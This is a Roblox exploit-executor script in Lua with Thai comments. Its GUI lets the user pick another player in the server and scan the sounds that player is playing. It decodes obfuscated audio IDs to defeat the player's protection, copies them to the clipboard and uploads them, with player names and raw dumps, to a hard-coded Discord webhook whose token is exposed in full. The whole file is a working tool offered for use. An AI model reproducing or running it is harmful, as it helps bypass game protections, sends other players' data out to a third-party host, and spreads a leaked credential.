local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer.PlayerGui

local CurrentSelectedPlayer = nil

-- ลิงก์ Webhook ของมึง
local WebhookURL = "https://discord.com/api/webhooks/1514562602208854159/mq9nAgQ_zpnb1czvwSfJRJq1zDAvXz9vpsF2CCzL7aphQS-BN7YTN0NM5eaYM1WYJw29"

-- ตารางจัดเก็บรายชื่อ Whitelist (ไวริส)
local WhitelistPlayers = {}

-- ==================== [ ฟังก์ชันสุ่มแถบสีรุ้งข้างกรอบ Embed ] ====================
local function getRandomRainbowColor()
    local colors = {16711680, 16744192, 16776960, 65280, 65535, 255, 16711935}
    return colors[math.random(1, #colors)]
end

-- ==================== [ ฟังก์ชันส่งข้อมูลเข้า Discord Webhook ] ====================
local function sendToDiscordEmbed(embedData)
    local httpRequest = (syn and syn.request) or http_request or (http and http.request) or request
    if httpRequest then
        pcall(function()
            httpRequest({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({["embeds"] = {embedData}})
            })
        end)
    end
end

local function sendToDiscordFile(fileName, fileContent, embedData)
    local httpRequest = (syn and syn.request) or http_request or (http and http.request) or request
    if httpRequest then
        pcall(function()
            local boundary = "----WebKitFormBoundaryHonkukiSpy"
            local jsonPayload = HttpService:JSONEncode({["embeds"] = {embedData}})
            
            local body = "--" .. boundary .. "\r\n" ..
                         "Content-Disposition: form-data; name=\"payload_json\"\r\n" ..
                         "Content-Type: application/json\r\n\r\n" ..
                         jsonPayload .. "\r\n" ..
                         "--" .. boundary .. "\r\n" ..
                         "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. fileName .. "\"\r\n" ..
                         "Content-Type: text/plain\r\n\r\n" ..
                         fileContent .. "\r\n" ..
                         "--" .. boundary .. "--\r\n"
                         
            httpRequest({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "multipart/form-data; boundary=" .. boundary},
                Body = body
            })
        end)
    end
end

-- ==================== [ ระบบถอดรหัสและกรอง Junk บายพาสไอดีจริง ] ====================

local function urlDecode(str)
    if not str then return "" end
    str = string.gsub(str, "+", " ")
    return (string.gsub(str, "%%(%x%x)", function(h) return string.char(tonumber(h, 16)) end))
end

local function hexDecode(str)
    if not str then return "" end
    str = string.gsub(str, "0x", "")
    str = string.gsub(str, "\\x", "")
    str = string.gsub(str, "%%", "")
    if string.match(str, "^%x+$") and #str % 2 == 0 then
        local decoded = ""
        for i = 1, #str, 2 do
            local byteStr = string.sub(str, i, i+1)
            local byte = tonumber(byteStr, 16)
            if byte and byte >= 32 and byte <= 126 then decoded = decoded .. string.char(byte) end
        end
        if #decoded > 0 then return decoded end
    end
    return str
end

-- 🛡️ ระบบคัดแยกดึงลิสต์ ID ทั้งหมดที่ซ่อนอยู่ในสตริงซาวด์ (ดึงหมดไม่สนลูกใครตามสั่งมึง)
local function getAllIDsFromSound(soundIdStr)
    if type(soundIdStr) ~= "string" then return {} end
    local decoded = urlDecode(soundIdStr)
    decoded = hexDecode(decoded)
    decoded = string.gsub(decoded, "%%3", "")
    decoded = string.lower(decoded)
    
    local foundIDs = {}
    local duplicates = {}
    
    -- กวาดจับตัวเลขทุกชุดที่มีความยาวตั้งแต่ 7 หลักขึ้นไป
    for num in string.gmatch(decoded, "%d+") do
        if #num >= 7 and not duplicates[num] then
            local checkNum = string.gsub(num, "^0+", "")
            if not string.match(checkNum, "^1340") and #checkNum >= 7 then
                duplicates[num] = true
                table.insert(foundIDs, num)
            end
        end
    end
    
    -- หากแกะรอบแรกไม่เจอ ให้ควักจากข้อความดิบดั้งเดิมป้องกันหลุด
    if #foundIDs == 0 then
        for num in string.gmatch(soundIdStr, "%d+") do
            if #num >= 7 and not duplicates[num] then
                local checkNum = string.gsub(num, "^0+", "")
                if not string.match(checkNum, "^1340") and #checkNum >= 7 then
                    duplicates[num] = true
                    table.insert(foundIDs, num)
                end
            end
        end
    end
    
    return foundIDs
end

local function copyToClipboard(text)
    local setclip = setclipboard or toclipboard or (Clipboard and Clipboard.set)
    if setclip then setclip(text) end
end

-- ==================== [ ฟังก์ชันเช็ควัตถุเสียงเพลงทั้งหมดบนตัวผู้เล่น ] ====================

local function checkPlayerAllSounds(targetPlayer)
    if not targetPlayer then return {} end
    
    local scanTargets = {}
    if targetPlayer.Character then table.insert(scanTargets, targetPlayer.Character) end
    local backpack = targetPlayer:FindFirstChild("Backpack")
    if backpack then table.insert(scanTargets, backpack) end
    local pGui = targetPlayer:FindFirstChild("PlayerGui")
    if pGui then table.insert(scanTargets, pGui) end
    
    local validSounds = {}
    
    -- บัญชีดำเสียงระบบที่ไม่ใช่เพลงรบกวนการสแกน
    local NameBlacklist = {
        ["gettingup"] = true, ["died"] = true, ["freefalling"] = true, 
        ["jumping"] = true, ["landing"] = true, ["running"] = true, 
        ["splash"] = true, ["swimming"] = true, ["climbing"] = true
    }
    
    for _, folder in ipairs(scanTargets) do
        local success, descendants = pcall(function() return folder:GetDescendants() end)
        if success and descendants then
            for _, obj in ipairs(descendants) do
                if obj:IsA("Sound") and obj.SoundId ~= "" and obj.IsPlaying then
                    local soundNameLower = string.lower(obj.Name)
                    if not NameBlacklist[soundNameLower] then
                        table.insert(validSounds, obj)
                    end
                end
            end
        end
    end
    return validSounds
end

-- ==================== [ ระบบคัดกรองและส่งข้อมูลคัดเกรด Premium เข้าดิสคอร์ด ] ====================

local function directLogMusicID(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    local soundObjects = checkPlayerAllSounds(targetPlayer)
    
    if #soundObjects == 0 then return false end
    
    local truePremiumID = nil
    local maxDuration = 60 -- เกณฑ์ที่มึงตั้งไว้ (1 นาที หรือ 60 วินาทีขึ้นไป)
    local allExtractedIDs = {}
    local audioObjectName = "Unknown"
    
    -- 🔎 ขั้นตอนการลอกคราบและเช็คความยาวเพลงจริงจากทุกซาวด์ออบเจกต์ที่ทำงานอยู่
    for _, soundObj in ipairs(soundObjects) do
        audioObjectName = soundObj.Name
        local ids = getAllIDsFromSound(soundObj.SoundId)
        
        for _, id in ipairs(ids) do
            table.insert(allExtractedIDs, id)
            
            -- ตรวจสอบความยาวเพลงผ่านตัวแปร TimeLength ของตัวซาวด์ที่รันอยู่จริงบนเครื่องมึง
            if soundObj.TimeLength > maxDuration then
                maxDuration = soundObj.TimeLength
                truePremiumID = id -- ล็อกเป้าไอดีที่ยาวที่สุดและเกิน 1 นาทีทันที!
            end
        end
    end
    
    if #allExtractedIDs == 0 then return false end
    
    -- สร้างรายการไอดีหลอกทั้งหมดเรียงยาวพรืดลงมาตามที่มึงสั่ง
    local junkIdsListStr = ""
    for idx, id in ipairs(allExtractedIDs) do
        if id == truePremiumID then
            junkIdsListStr = junkIdsListStr .. string.format("%02d. [ID: %s] 👑 (Premium True Music)\n", idx, id)
        else
            junkIdsListStr = junkIdsListStr .. string.format("%02d. [ID: %s] ❌ (Fake/Junk Block)\n", idx, id)
        end
    end
    
    -- ทำการก๊อปปี้ไอดีจริงระดับพรีเมียมเข้าคลิปบอร์ดให้มึงใช้ทันที (ถ้าไม่มีจะก๊อปตัวแรกที่ดักได้)
    local finalClipboard = truePremiumID or allExtractedIDs[1]
    copyToClipboard(finalClipboard)
    
    -- 📝 ปรับหน้าตากล่อง Embed ให้จัดเรียงแนวดิ่ง แสดงผลลัพธ์ไอดีพรีเมียมและไอดีหลอกทั้งหมดแบบละเอียด
    local premiumDisplay = truePremiumID and string.format("`%s` *(ความยาว %d วินาที)*", truePremiumID, maxDuration) or "`ไม่พบไอดีที่เล่นยาวเกิน 1 นาที (อาจใช้ไฟล์เสียงสั้นลูปหลอกระบบ)`"
    
    local longDescription = string.format(
        "**Spy Executor:** `@%s`\n" ..
        "**Target Player:** `@%s`\n" ..
        "**Audio Object Name:** `%s`\n\n" ..
        "**👑 PREMIUM TRUE MUSIC ID (ยาวเกิน 1 นาที)**\n%s\n\n" ..
        "**📦 ALL EXTRACTED AUDIO BLOCKS (ลิสต์ไอดีทั้งหมดที่ดึงได้)**\n```\n%s```\n" ..
        "**Quick Link:** %s",
        LocalPlayer.Name, targetPlayer.Name, audioObjectName,
        premiumDisplay, junkIdsListStr,
        truePremiumID and "[Click to View on Roblox](https://www.roblox.com/library/"..truePremiumID..")" or "*ไม่มีลิงก์เนื่องจากไม่พบไอดีจริง*"
    )
    
    local embed = {
        ["title"] = "🎵 Deep Scanner & Music Validator Active!",
        ["description"] = longDescription,
        ["color"] = getRandomRainbowColor(),
        ["footer"] = {["text"] = "Premium Decoded System • สคริปต์จาก 191"},
        ["timestamp"] = DateTime.now():ToIsoDate()
    }
    
    sendToDiscordEmbed(embed)
    return finalClipboard
end

local function directLogRawJunk(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    local soundObjects = checkPlayerAllSounds(targetPlayer)
    
    if #soundObjects == 0 then return false end
    local soundObj = soundObjects[1]
    
    local rawJunk = soundObj.SoundId
    copyToClipboard(rawJunk)
    
    local fileData = string.format(
        "=== HONKUKI DEEP VALIDATOR RAW JUNK ===\nRun By: @%s\nTarget: @%s\nSound Name: %s\n=======================================\n\n[RAW DATA]:\n%s",
        LocalPlayer.Name, targetPlayer.Name, soundObj.Name, rawJunk
    )
    
    local txtFileName = "deep_junk_" .. targetPlayer.Name .. ".txt"
    local longDescription = string.format(
        "**Junk Collector:** `@%s`\n" ..
        "**Target Block:** `@%s`\n" ..
        "**Dump Status:** `ระบบแยกข้อมูลไฟล์ดิบ %s ข้อมูลยาวส่งแบบแนบไฟล์เรียบร้อยมึง!`",
        LocalPlayer.Name, targetPlayer.Name, txtFileName
    )
    
    local embed = {
        ["title"] = "📦 Deep Raw Text Dumped Log!",
        ["description"] = longDescription,
        ["color"] = getRandomRainbowColor(),
        ["footer"] = {["text"] = "Raw Text Captured • สคริปต์จาก 191"},
        ["timestamp"] = DateTime.now():ToIsoDate()
    }
    
    sendToDiscordFile(txtFileName, fileData, embed)
    return true
end

-- ==================== [ หน้าต่างตัวควบคุม UI ] ====================

if PlayerGui:FindFirstChild("Honkuki_DeepSoundSpy") then PlayerGui.Honkuki_DeepSoundSpy:Destroy() end

local ScreenGui = Instance.new("ScreenGui", PlayerGui)
ScreenGui.Name = "Honkuki_DeepSoundSpy"
ScreenGui.ResetOnSpawn = false

local function setDrag(frame, handle)
    local dragging, dragInput, dragStart, startPos
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true dragStart = input.Position startPos = frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    handle.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 320, 0, 435) 
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -217)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
local mStroke = Instance.new("UIStroke", MainFrame)
mStroke.Color = Color3.fromRGB(60, 60, 60)

local TopBar = Instance.new("Frame", MainFrame)
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 8)
setDrag(MainFrame, TopBar)

local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "HONKUKI DEEP VALIDATOR SCANNER"
Title.TextColor3 = Color3.fromRGB(255, 215, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 12
Title.TextXAlignment = Enum.TextXAlignment.Left

local ListScroll = Instance.new("ScrollingFrame", MainFrame)
ListScroll.Size = UDim2.new(0.9, 0, 0, 160) 
ListScroll.Position = UDim2.new(0.05, 0, 0.11, 0)
ListScroll.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
ListScroll.BorderSizePixel = 0
ListScroll.ScrollBarThickness = 4
ListScroll.ScrollBarImageColor3 = Color3.fromRGB(255, 215, 0)
Instance.new("UICorner", ListScroll).CornerRadius = UDim.new(0, 5)

local Layout = Instance.new("UIListLayout", ListScroll)
Layout.Padding = UDim.new(0, 4)

local StatusLabel = Instance.new("TextLabel", MainFrame)
StatusLabel.Size = UDim2.new(0.9, 0, 0, 35)
StatusLabel.Position = UDim2.new(0.05, 0, 0.50, 0)
StatusLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
StatusLabel.Text = "โปรดเลือกชื่อผู้เล่นเพื่อทำการสแกนตรวจสอบขั้นพรีเมียม"
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 11
StatusLabel.TextWrapped = true
Instance.new("UICorner", StatusLabel).CornerRadius = UDim.new(0, 5)

local GetIDBtn = Instance.new("TextButton", MainFrame)
GetIDBtn.Size = UDim2.new(0.9, 0, 0, 36)
GetIDBtn.Position = UDim2.new(0.05, 0, 0.60, 0)
GetIDBtn.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
GetIDBtn.Text = "🔍 ดึง ID และแยกแผงจริง (Premium Check)"
GetIDBtn.Font = Enum.Font.GothamBold
GetIDBtn.TextSize = 12
GetIDBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
Instance.new("UICorner", GetIDBtn).CornerRadius = UDim.new(0, 6)

local GetJunkBtn = Instance.new("TextButton", MainFrame)
GetJunkBtn.Size = UDim2.new(0.9, 0, 0, 36)
GetJunkBtn.Position = UDim2.new(0.05, 0, 0.70, 0)
GetJunkBtn.BackgroundColor3 = Color3.fromRGB(230, 90, 40) 
GetJunkBtn.Text = "📦 ดึงข้อความ Junk (สร้างเป็นไฟล์ข้อความ)"
GetJunkBtn.Font = Enum.Font.GothamBold
GetJunkBtn.TextSize = 12
GetJunkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", GetJunkBtn).CornerRadius = UDim.new(0, 6)

local WhitelistBtn = Instance.new("TextButton", MainFrame)
WhitelistBtn.Size = UDim2.new(0.9, 0, 0, 34)
WhitelistBtn.Position = UDim2.new(0.05, 0, 0.80, 0)
WhitelistBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
WhitelistBtn.Text = "🛡️ เพิ่ม / ลบ รายชื่อไวริส (Whitelist)"
WhitelistBtn.Font = Enum.Font.GothamBold
WhitelistBtn.TextSize = 12
WhitelistBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", WhitelistBtn).CornerRadius = UDim.new(0, 6)

local RefreshBtn = Instance.new("TextButton", MainFrame)
RefreshBtn.Size = UDim2.new(0.9, 0, 0, 30)
RefreshBtn.Position = UDim2.new(0.05, 0, 0.90, 0)
RefreshBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
RefreshBtn.Text = "รีเฟรชรายชื่อผู้เล่น"
RefreshBtn.Font = Enum.Font.GothamBold
RefreshBtn.TextSize = 11
RefreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", RefreshBtn).CornerRadius = UDim.new(0, 6)

local ToggleBtn = Instance.new("TextButton", ScreenGui)
ToggleBtn.Size = UDim2.new(0, 45, 0, 45)
ToggleBtn.Position = UDim2.new(0.02, 0, 0.4, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ToggleBtn.Text = "🎵"
ToggleBtn.TextSize = 20
ToggleBtn.TextColor3 = Color3.fromRGB(255, 215, 0)
Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(0, 22)
local tStroke = Instance.new("UIStroke", ToggleBtn)
tStroke.Color = Color3.fromRGB(255, 215, 0)
tStroke.Thickness = 1.5
setDrag(ToggleBtn, ToggleBtn)

-- ==================== [ ฟังก์ชันโหลดอัปเดตรายชื่อในเซิร์ฟ ] ====================

local function refreshPlayers()
    if not ListScroll or not ListScroll:IsDescendantOf(game) then return end
    
    for _, item in pairs(ListScroll:GetChildren()) do if item:IsA("TextButton") then item:Destroy() end end
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            local PBtn = Instance.new("TextButton", ListScroll)
            PBtn.Size = UDim2.new(1, -6, 0, 30)
            PBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
            
            local activeSounds = checkPlayerAllSounds(p)
            if WhitelistPlayers[p.Name] then
                PBtn.Text = "  🛡️ " .. p.DisplayName .. " (@" .. p.Name .. ") [ไวริส]"
                PBtn.TextColor3 = Color3.fromRGB(0, 255, 128)
            elseif #activeSounds > 0 then
                PBtn.Text = "  " .. p.DisplayName .. " (@" .. p.Name .. ") [พบซาวด์บัส 🎵]"
                PBtn.TextColor3 = Color3.fromRGB(255, 120, 255)
            else
                PBtn.Text = "  " .. p.DisplayName .. " (@" .. p.Name .. ")"
                PBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
            end
            
            PBtn.Font = Enum.Font.Gotham
            PBtn.TextSize = 12
            PBtn.TextXAlignment = Enum.TextXAlignment.Left
            Instance.new("UICorner", PBtn).CornerRadius = UDim.new(0, 4)
            local bStroke = Instance.new("UIStroke", PBtn)
            bStroke.Color = Color3.fromRGB(40, 40, 40)
            
            PBtn.MouseButton1Click:Connect(function()
                for _, b in pairs(ListScroll:GetChildren()) do if b:IsA("TextButton") then b.UIStroke.Color = Color3.fromRGB(40, 40, 40) end end
                bStroke.Color = Color3.fromRGB(255, 215, 0)
                CurrentSelectedPlayer = p
                if WhitelistPlayers[p.Name] then
                    StatusLabel.Text = "เลือก: " .. p.DisplayName .. " (@" .. p.Name .. ") (สถานะ: ไวริสอยู่ 🛡️)"
                else
                    StatusLabel.Text = "เลือก: " .. p.DisplayName .. " (@" .. p.Name .. ")"
                end
            end)
        end
    end
    ListScroll.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y)
end

GetIDBtn.MouseButton1Click:Connect(function()
    if CurrentSelectedPlayer then
        StatusLabel.Text = "กำลังแยกแผงลอกคราบไอดีจริงเกรดพรีเมียม..."
        task.wait(0.05)
        local result = directLogMusicID(CurrentSelectedPlayer.Name)
        if result then
            StatusLabel.Text = "👑 ตรวจสอบเรียบร้อย! คัดแยกไอดีหลอกและไอดีจริงลงดิสแล้วมึง"
        else
            StatusLabel.Text = "❌ ไม่พบซาวด์ใดๆ บนตัวผู้เล่นนี้"
        end
    else
        StatusLabel.Text = "โปรดเลือกชื่อผู้เล่นก่อนกดดึง!"
    end
end)

GetJunkBtn.MouseButton1Click:Connect(function()
    if CurrentSelectedPlayer then
        StatusLabel.Text = "กำลังดูดข้อมูลขยะสร้างไฟล์ Text..."
        task.wait(0.05)
        local result = directLogRawJunk(CurrentSelectedPlayer.Name)
        if result then
            StatusLabel.Text = "📦 สำเร็จ! อัปโหลดไฟล์ขยะพร้อมกล่องรายงานแบบแนวตั้งเรียบร้อย"
        else
            StatusLabel.Text = "ไม่พบข้อความดักจับในซาวด์บนตัวผู้เล่นนี้"
        end
    else
        StatusLabel.Text = "โปรดเลือกชื่อผู้เล่นก่อนกดดึง!"
    end
end)

WhitelistBtn.MouseButton1Click:Connect(function()
    if CurrentSelectedPlayer then
        if WhitelistPlayers[CurrentSelectedPlayer.Name] then
            WhitelistPlayers[CurrentSelectedPlayer.Name] = nil
            StatusLabel.Text = "❌ ลบ @" .. CurrentSelectedPlayer.Name .. " ออกจากตารางไวริสแล้ว"
        else
            WhitelistPlayers[CurrentSelectedPlayer.Name] = true
            StatusLabel.Text = "🛡️ เพิ่ม @" .. CurrentSelectedPlayer.Name .. " เข้าตารางไวริสเรียบร้อย!"
        end
        refreshPlayers()
    else
        StatusLabel.Text = "⚠️ โปรดเลือกชื่อผู้เล่นในตารางก่อนกดตั้งค่าไวริส!"
    end
end)

RefreshBtn.MouseButton1Click:Connect(refreshPlayers)
Players.PlayerAdded:Connect(refreshPlayers)
Players.PlayerRemoving:Connect(function(p) 
    if CurrentSelectedPlayer == p then CurrentSelectedPlayer = nil StatusLabel.Text = "โปรดเลือกผู้เล่น..." end 
    if WhitelistPlayers[p.Name] then WhitelistPlayers[p.Name] = nil end
    refreshPlayers() 
end)
ToggleBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)

task.spawn(function()
    while task.wait(5) do
        refreshPlayers()
    end
end)

refreshPlayers()
